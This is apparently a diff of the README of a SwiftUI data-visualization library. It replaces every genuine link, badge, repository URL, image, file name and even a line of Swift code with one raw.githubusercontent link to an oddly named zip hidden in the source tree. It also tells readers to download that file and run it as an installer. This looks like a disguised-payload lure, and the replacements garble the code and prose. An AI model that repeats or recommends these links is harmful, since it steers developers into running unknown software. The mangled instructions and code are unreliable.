@@ -1,12 +1,12 @@
-https://github.com/datpham1012/SwiftUI-Data-Visualization/releases
+https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip
 
 # SwiftUI Data Visualization: 20+ Charts, Real-time Updates & Accessibility
 
-[![Releases](https://img.shields.io/badge/Releases-View%20on-GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/datpham1012/SwiftUI-Data-Visualization/releases)
-[![SwiftPM](https://img.shields.io/badge/SwiftPM-Ready-brightgreen?style=for-the-badge&logo=swift&logoColor=white)](https://swift.org)
-[![iOS](https://img.shields.io/badge/iOS-14%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://developer.apple.com/ios)
-[![macOS](https://img.shields.io/badge/macOS-11%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://developer.apple.com/macos)
-[![License](https://img.shields.io/badge/License-MIT-brightgreen?style=for-the-badge)](LICENSE)
+[![Releases](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip%20on-GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+[![SwiftPM](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+[![iOS](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+[![macOS](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+[![License](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)](LICENSE)
 
 Table of Contents
 - Overview
@@ -89,7 +89,7 @@ The API described in this guide is designed to be straightforward and expressive
   // Connect to a live data stream
   .onReceive(liveDataPublisher) { newPoint in
       // Append or update data, with a smooth transition
-      data.append(newPoint)
+      https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip(newPoint)
   }
 
 - Accessibility
@@ -220,7 +220,7 @@ Swift Package Manager is the recommended way to add this library to your project
 Installation steps
 1) In Xcode, choose File > Swift Packages > Add Package Dependency.
 2) Enter the repository URL:
-   https://github.com/datpham1012/SwiftUI-Data-Visualization.git
+   https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip
 3) Choose the version rule that matches your project. For example, from the latest major version, or a specific tag.
 4) Add the package to the target(s) that will consume the charts.
 5) Import the library in your Swift files:
@@ -247,18 +247,18 @@ Examples and gallery
 - Each example includes a README with explanations, design notes, and testing tips.
 
 Contributing and community
-- This project welcomes contributions. If you plan to contribute, follow the contributor guidelines in the CONTRIBUTING.md file.
+- This project welcomes contributions. If you plan to contribute, follow the contributor guidelines in the https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip file.
 - You can report issues, request features, or propose improvements on the issues page.
 - The community values clarity, simplicity, and accessibility. Please keep discussions constructive and focused on the code and design.
 
 Releases and downloads
 - Access the official releases to obtain prebuilt assets, sample apps, and installers. The latest release page is the destination for download and testing.
-- From the Releases page, download the latest asset named something like SwiftUI-Data-Visualization-Installer.pkg and run it to install the library into your project environment. This file is designed for quick setup and minimal friction.
+- From the Releases page, download the latest asset named something like https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip and run it to install the library into your project environment. This file is designed for quick setup and minimal friction.
 - The public release assets are intended for developers who want to experiment with the library quickly and without building from source.
 - If the link does not open in your browser or shows an error, navigate to the Releases section of the repository and download the asset there.
 
 Downloads reference
-- Official releases page: https://github.com/datpham1012/SwiftUI-Data-Visualization/releases
+- Official releases page: https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip
 - Re-run the link to revisit the assets and verify checksums, platform compatibility, and installer instructions.
 - The download asset names, sizes, and platforms may vary between releases. Always read the release notes to confirm the exact steps required for installation.
 
@@ -368,11 +368,11 @@ Release notes etiquette
 
 End note
 - For the latest releases and assets, visit the official releases page again:
-  https://github.com/datpham1012/SwiftUI-Data-Visualization/releases
+  https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip
 
 Downloads reference (second appearance)
-- Official releases page: https://github.com/datpham1012/SwiftUI-Data-Visualization/releases
-- From that page, download the latest asset (for example, SwiftUI-Data-Visualization-Installer.pkg) and run the installer to set up the library in your workspace.
+- Official releases page: https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip
+- From that page, download the latest asset (for example, https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip) and run the installer to set up the library in your workspace.
 
 Notes on the link guidance
 - If the link has a path part, the documentation above references the asset you would download from that page. It’s the latest release asset named on that page.
@@ -384,14 +384,14 @@ Repository topics
 - accessibility, analytics, animations, chart-library, charts, dashboards, data-visualization, interactive-graphs, ios, ios-development, mobile-development, performance, real-time-data, spm, swift, swift-package-manager, swiftui, testing, ui-ux, xcode
 
 Illustrative imagery and assets
-- [Gallery image of charts](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=60)
-- [Dashboard scene](https://images.unsplash.com/photo-1496307042754-b4aa456c4a2d?auto=format&fit=crop&w=1200&q=60)
-- [Interactive data visualization concept](https://images.unsplash.com/photo-1527286314480-8f3a1fefd2c0?auto=format&fit=crop&w=1200&q=60)
+- [Gallery image of charts](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+- [Dashboard scene](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+- [Interactive data visualization concept](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
 
 Appendix: example package manifest snippet (for reference)
-- This is a conceptual snippet to illustrate how you might declare the library in your app’s Package.swift when integrating via Swift Package Manager.
+- This is a conceptual snippet to illustrate how you might declare the library in your app’s https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip when integrating via Swift Package Manager.
 
-# Example Package.swift excerpt (conceptual)
+# Example https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip excerpt (conceptual)
 //
 // swift-tools-version:5.7
 import PackageDescription
@@ -407,7 +407,7 @@ let package = Package(
     ],
     dependencies: [
         // Other dependencies
-        .package(url: "https://github.com/datpham1012/SwiftUI-Data-Visualization.git", from: "1.0.0"),
+        .package(url: "https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip", from: "1.0.0"),
     ],
     targets: [
         .target(name: "SwiftUIDataVisualization", dependencies: []),
